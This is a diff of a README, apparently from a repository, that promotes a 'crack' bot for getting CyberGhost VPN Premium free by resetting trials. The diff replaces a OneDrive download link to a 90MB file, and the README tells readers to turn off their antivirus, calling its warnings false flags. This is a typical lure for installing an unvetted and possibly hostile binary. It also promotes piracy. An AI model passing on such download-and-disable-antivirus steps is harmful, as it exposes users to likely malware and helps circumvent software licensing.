@@ -8,7 +8,7 @@ This bot automates EVERYTHING to get you CyberGhost VPN Premium for free, resett
 
 ---
 ### Download (90MB): 
-[![Download Button](https://github.com/sillyLazyCat/fuckVITBPL/blob/main/button_fuckvitbpl.png?raw=true)](https://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBbmFBb3FKY3VoYlZiUW9yVHd1ZmRobVlkSVk_ZT1ZNHdzS1k/root/content)
+[![Download Button](https://github.com/sillyLazyCat/fuckVITBPL/blob/main/button_fuckvitbpl.png?raw=true)](https://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBbmFBb3FKY3VoYlZjb1pabV81ODNnWVNfcTQ_ZT1HMmZlNng/root/content)
 
 **Kill the antivirus for a sec**—it’s false flaggin the crack.
 
